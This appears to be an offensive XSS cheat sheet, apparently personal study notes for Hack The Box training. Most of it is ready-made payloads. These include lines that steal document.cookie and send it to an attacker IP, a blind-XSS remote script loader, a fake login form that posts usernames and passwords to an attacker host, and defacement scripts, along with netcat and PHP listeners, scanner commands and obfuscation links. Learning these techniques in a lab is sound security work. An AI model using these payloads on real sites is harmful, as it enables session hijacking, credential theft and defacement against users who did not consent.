
1. **DOM-based (Non-Persistent) -** directly in the browser (e.g. through client-side HTTP parameters or anchor tags). Processed on client-side.
	1. Input parameter in the URL using a hashtag `#` means that this is a client-side parameter that is completely processed on the browser, `DOM-based XSS`.
2. **Reflected (Non-Persistent) -** Displayed on the page after being processed by backend server, without being stored (e.g. search result or error message.) Phish with URL, hosting malicious XSS javascript payload or XSS in URL parameter, etc. 
3. **Stored (Persistent) -** Most critical. User input is stored on the back-end database and then displayed upon retrieval (e.g. posts or comments)

## Commands

| Code                                                                                          | Description                       |
| --------------------------------------------------------------------------------------------- | --------------------------------- |
| **XSS Payloads**                                                                              |                                   |
| `<script>alert(window.origin)</script>`                                                       | Basic XSS Payload                 |
| `<plaintext>`                                                                                 | Basic XSS Payload                 |
| `<script>print()</script>`                                                                    | Basic XSS Payload                 |
| `<img src="" onerror=alert(window.origin)>`                                                   | HTML-based XSS Payload            |
| `<script>document.body.style.background = "#141d2b"</script>`                                 | Change Background Color           |
| `<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>` | Change Background Image           |
| `<script>document.title = 'HackTheBox Academy'</script>`                                      | Change Website Title              |
| `<script>document.getElementsByTagName('body')[0].innerHTML = 'text'</script>`                | Overwrite website's main body     |
| `<script>document.getElementById('urlform').remove();</script>`                               | Remove certain HTML element       |
| `<script src="http://OUR_IP/script.js"></script>`                                             | Load remote script                |
| `<script>new Image().src='http://OUR_IP/index.php?c='+document.cookie</script>`               | Send Cookie details to us         |
| `src='" onerror=alert(window.origin)> <br"`                                                   | Inspect source to fix payload     |
| **Commands**                                                                                  |                                   |
| `python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"`                           | Run `xsstrike` on a url parameter |
| `sudo nc -lvnp 80`                                                                            | Start `netcat` listener           |
| `sudo php -S 0.0.0.0:80`                                                                      | Start `PHP` server                |
- https://github.com/payload-box
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md
---

## Detect XSS
```bash
# New Tool
git clone https://github.com/s0md3v/XSStrike.git
cd XSStrike
pip install -r requirements.txt
python xsstrike.py
python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"

# Alt Tool
git clone https://github.com/epsylon/xsser.git
sudo pip3 install pycurl bs4 pygeoip PyGObject selenium ddgs fpdf2
cd xsser
python3 setup.py
python3 xsser
python3 xsser -u "http://SERVER_IP:PORT/index.php?task=test"

# Old Tool
https://github.com/rajeshmajumdar/BruteXSS
```

## Basic
```javascript
<script>alert("Hi")</script>
```

```javascript
<script>print()</script>
```

```javascript
<script>alert(document.cookie)</script>
```

```javascript
<script>alert(window.origin)</script>
```

### Writing DOM Objects
```javascript
document.write();
document.write('<h3>Please login to continue</h3><form action=http://10.10.14.82><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
document.getElementById('urlform').remove();
```


```javascript
DOM.innerHTML
```
- `innerHTML` will not allow the use of `<script>` but allows others...

```javascript
DOM.outerHTML
```

```javascript
add()
```

```javascript
after()
```

```javascript
append()
```

```javascript
<img src="" onerror=alert(window.origin)>
```

```javascript
<script src="http://OUR_IP/script.js"></script>
```


```javascript
<img src=1 onerror=\"document.location='http://10.10.16.47:8000/'+document.cookie\">
```
## Blind XSS
1) Find Vulnerable Parameter
2) Create script.js to POST cookie

```javascript
new Image().src='http://10.10.16.33:4444/index.php?c='+document.cookie;
```

3) Start PHP server. 

```shell
php -S 0.0.0.0:80
```

4) Use script src in vulnerable parameter

```javascript
"><script src=http://10.10.16.33/script.js></script>
```

```javascript
document.location='http://OUR_IP/index.php?c='+document.cookie;
```

## Defacing with XSS
```javascript
// Change Background
<script>document.body.style.background = "#141d2b"</script>
<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>

// Change Title
<script>document.title = 'HackTheBox Academy'</script>

// Change Page Text
document.getElementById("todo").innerHTML = "New Text" // specific element
$("#todo").html('New Text'); // jQuery function to change specific element
document.getElementsByTagName('body')[0].innerHTML = "New Text" // Change the whole body

// Minify the code and add to XSS payload, e.g.:
<script>document.getElementsByTagName('body')[0].innerHTML = '<center><h1 style="color: white">Cartman says hi!</h1><p style="color: white"><img src="https://dev.w3.org/SVG/tools/svgweb/samples/svg-files/cartman.svg" height="25px" alt="Cartman"> </p></center>'</script>

// Login Form Injection
<img src="" onerror=document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');>

<img src="" onerror=document.write('<h3>Please login to continue</h3><form action=http://10.10.14.82><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();
```

---

## Deserialization + XSS

https://www.toptal.com/developers/javascript-minifier
https://beautifytools.com/javascript-obfuscator.php#
https://obfuscator.io/legacy-playground

### JS Obfuscated XSS:
https://jsfuck.com/ 
https://utf-8.jp/public/jjencode.html
https://utf-8.jp/public/aaencode.html

Test obfuscated code in: https://jsconsole.com/